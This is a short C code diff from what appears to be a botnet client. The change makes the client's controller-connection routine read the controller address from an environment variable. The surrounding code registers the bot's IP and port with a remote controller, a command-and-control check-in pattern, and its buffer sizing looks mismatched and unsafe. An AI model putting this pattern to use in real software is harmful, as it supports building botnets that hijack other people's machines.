@@ -18,6 +18,7 @@ int main(int argc, char const *argv[])
 
     setBotIP();
 
+
     ret = connectToController();
     if (ret < 0)
         handle_error("Could not connect to controller");
@@ -52,7 +53,7 @@ int connectToController()
     char *url = (char *)malloc(sizeof(PROTOCOL) + sizeof(IP) + sizeof(C_PORT) + sizeof(C_IP) + 5);
 
     strcpy(url, PROTOCOL);
-    strcat(url, CONTROLLER_IP);
+    strcat(url, getenv(CONTROLLER_IP));
 
     char *query = (char *)malloc(16 + sizeof(IP) + 5);
     sprintf(query, "?PORT=%ld&IP=%s", port, IP);
